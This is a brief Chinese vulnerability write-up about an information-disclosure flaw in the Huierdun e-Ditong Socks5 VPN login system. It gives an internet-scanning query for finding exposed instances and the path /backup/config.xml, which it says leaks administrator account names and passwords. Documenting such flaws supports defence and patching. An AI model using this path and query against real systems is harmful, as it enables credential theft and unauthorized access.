# 惠尔顿 e地通 config.xml 信息泄漏漏洞

## 漏洞描述

惠尔顿 e地通Socks5 VPN登录系统 存在信息泄漏漏洞，访问特殊的Url即可获取管理员账号密码

## 漏洞影响

<a-checkbox checked>惠尔顿 e地通Socks5 VPN登录系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="惠尔顿-e地通VPN"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1628837615163-cf6222d5-9630-43d5-a1a9-5ede8f841c0b.png)

访问 `/backup/config.xml，` 泄漏用户信息

![img](../../../.vuepress/public/img/1628837652687-ff33f695-2d51-4770-84b2-97917a838569.png)



